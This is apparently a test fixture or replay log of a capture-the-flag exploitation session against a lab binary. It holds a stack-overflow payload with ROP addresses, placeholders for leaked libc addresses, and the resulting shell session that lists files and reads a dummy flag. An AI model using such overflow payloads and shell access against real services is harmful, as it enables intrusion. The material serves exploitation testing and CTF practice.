@@ -1,0 +1,21 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa3\\t@\\x00\\x00\\x00\\x00\\x00\\x18\\x10`\\x00\\x00\\x00\\x00\\x00 \\x06@\\x00\\x00\\x00\\x00\\x00\\xb6\\x07@\\x00\\x00\\x00\\x00\\x00\\n", 
+    "1welcome!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 
+    "0\\n", 
+    "1\\nHTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>{{{LIBC_BASE:456336:6:ORI:138:0x7f360df37690}}}\\nWho r u?\\n", 
+    "0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:283158:8:ORI:184:0x7f360df0d216}}}\\n", 
+    "1welcome!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 
+    "0\\n", 
+    "1\\nHTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0ls\\n", 
+    "1bin\\ndev\\nflag\\nlib\\nlib32\\nlib64\\nlibc.so\\npwn\\npwn.start.sh\\npwn_test\\npwn_test.start.sh\\ntmp\\nusr\\n", 
+    "0pwd\\n", 
+    "1/\\n", 
+    "0cd /flag\\n", 
+    "2sh: 3: cd: can\\'t cd to /flag\\n", 
+    "0ls -lrt\\n", 
+    "1total 2108\\ndrwxr-x--- 1 0 1000    4096 Nov 27 05:22 lib64\\ndrwxr-x--- 1 0 1000    4096 Nov 27 05:22 lib32\\ndrwxr-x--- 1 0 1000    4096 Nov 27 05:22 lib\\ndrwxr-x--- 1 0 1000    4096 Nov 27 05:22 dev\\ndrwxr-x--- 1 0 1000    4096 Nov 27 05:22 bin\\n-rwxr----- 1 0 1000      56 Dec  1 01:07 flag\\n-rwxr-x--- 1 0 1000      46 Dec  1 01:07 pwn_test.start.sh\\n-rwxr-x--- 1 0 1000      41 Dec  1 01:07 pwn.start.sh\\n-rwxr-x--- 1 0 1000 1868984 Dec  1 01:07 libc.so\\n-rwxr-x--- 1 0 1000    9112 Dec  1 01:08 pwn_test\\n-rwxr-x--- 1 0 1000  233472 Dec  1 01:21 pwn\\ndrwxrwxrwx 1 0 1000    4096 Dec  1 01:21 tmp\\ndrwxr-x--- 1 0 1000    4096 Dec  1 01:21 usr\\n", 
+    "0cat flag\\n", 
+    "1hwctf{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}"
+]
